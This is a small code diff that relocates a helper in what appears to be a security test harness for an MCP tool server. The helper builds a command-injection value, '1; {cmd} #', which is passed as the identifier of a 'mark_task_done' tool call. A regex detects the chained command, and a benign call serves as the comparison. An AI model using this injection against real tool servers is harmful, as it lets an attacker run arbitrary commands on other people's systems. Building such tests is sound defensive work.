@@ -64,16 +64,16 @@ KEPT_PLACES: tuple[str, ...] = tuple(PLACE_COMMANDS)
 AIM = re.compile(r";\s*\S")  # the payload chains a command after `;`; the benign call does not
 
 
-def _payload(cmd: str) -> str:
-    # `#` comments out the template's trailing ` done`, so the injected command is the last run.
-    return f"1; {cmd} #"
-
-
 def _make_exploit(cmd: str):
     async def exploit(places: Places, client: MCPClientPort) -> None:
         await client.call_tool("mark_task_done", {"identifier": _payload(cmd)})
 
     return exploit
+
+
+def _payload(cmd: str) -> str:
+    # `#` comments out the template's trailing ` done`, so the injected command is the last run.
+    return f"1; {cmd} #"
 
 
 async def _benign(places: Places, client: MCPClientPort) -> None:
